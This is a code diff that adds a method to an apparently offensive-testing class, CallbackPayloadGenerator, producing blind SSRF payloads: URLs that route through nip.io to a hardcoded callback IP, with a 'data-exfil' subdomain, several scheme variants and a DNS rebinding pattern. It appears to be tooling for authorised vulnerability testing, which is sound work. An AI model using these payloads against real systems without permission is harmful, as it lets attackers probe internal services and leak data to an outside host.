@@ -178,6 +178,60 @@ class CallbackPayloadGenerator:
         
         return payloads
     
+    def generate_dns_payloads(self, test_id: str, dns_server_ip: str = '40.82.145.240') -> List[Dict[str, str]]:
+        """
+        Generate DNS-based SSRF payloads for Blind SSRF testing
+        
+        Args:
+            test_id: Unique test identifier
+            dns_server_ip: DNS callback server IP (default from .env)
+        
+        Returns:
+            List of DNS payload dictionaries
+        """
+        payloads = []
+        
+        # Basic DNS callback using nip.io (wildcard DNS)
+        # nip.io resolves *.IP.nip.io to IP
+        base_domain = f"{test_id}.{dns_server_ip}.nip.io"
+        
+        payloads.append({
+            'payload': f"http://{base_domain}",
+            'technique': 'dns-basic',
+            'description': f'Basic DNS callback via nip.io'
+        })
+        
+        # DNS with subdomain (for exfiltration detection)
+        payloads.append({
+            'payload': f"http://data-exfil.{base_domain}",
+            'technique': 'dns-subdomain',
+            'description': 'DNS callback with subdomain'
+        })
+        
+        # DNS without HTTP scheme (some apps auto-add http://)
+        payloads.append({
+            'payload': base_domain,
+            'technique': 'dns-no-scheme',
+            'description': 'Domain without protocol'
+        })
+        
+        # DNS with various protocols
+        for protocol in ['http://', 'https://', 'ftp://']:
+            payloads.append({
+                'payload': f"{protocol}{base_domain}",
+                'technique': f'dns-{protocol.rstrip("://")}',
+                'description': f'DNS callback with {protocol.rstrip("://")} protocol'
+            })
+        
+        # DNS rebinding pattern (for advanced attacks)
+        payloads.append({
+            'payload': f"http://rebind-{test_id}.{dns_server_ip}.nip.io",
+            'technique': 'dns-rebinding',
+            'description': 'DNS rebinding pattern'
+        })
+        
+        return payloads
+    
     def generate_cloud_metadata_payloads(self, test_id: str) -> List[Dict[str, str]]:
         """Generate payloads to access cloud metadata services"""
         payloads = []
